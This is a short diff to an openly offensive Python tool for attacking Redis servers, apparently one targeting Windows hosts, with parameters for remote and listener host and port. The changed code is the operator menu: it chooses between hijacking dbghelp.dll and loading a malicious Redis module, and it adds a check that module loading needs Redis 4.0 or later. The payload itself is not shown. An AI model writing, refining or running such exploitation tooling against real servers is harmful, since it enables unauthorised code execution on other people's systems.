@@ -275,14 +275,20 @@ def run(rhost, rport, lhost, lport):
                 if os.path.exists(winfilename[1]) == False:
                     print("\033[1;31;40m[-]\033[0m Where you module(win)? ")
                     exit(0)
-            choice = input("\033[92m[+]\033[0m What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: ")
-            if choice.startswith("h"):
-                expfile = os.path.basename(winfilename[0])
-            if choice.startswith("l"):
-                expfile = os.path.basename(winfilename[1])
-            if choice.startswith("e"):
-                print("[*] User Quit..")
-                return
+            while 1:
+                choice = input("\033[92m[+]\033[0m What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: ")
+                if choice.startswith("h"):
+                    expfile = os.path.basename(winfilename[0])
+                    break
+                elif choice.startswith("l") and int(redis_version[0])>=4:
+                    expfile = os.path.basename(winfilename[1])
+                    break
+                elif choice.startswith("l") and int(redis_version[0])<4:
+                    print("\033[92m[!]\033[0m Target Redis is < 4.0 and does not support module load , please select [h]ijack dbghelp.dll")
+                    continue
+                if choice.startswith("e"):
+                    print("[*] User Quit..")
+                    return
         else:
             print("[#] Please use other tools to attack the redis")
             return
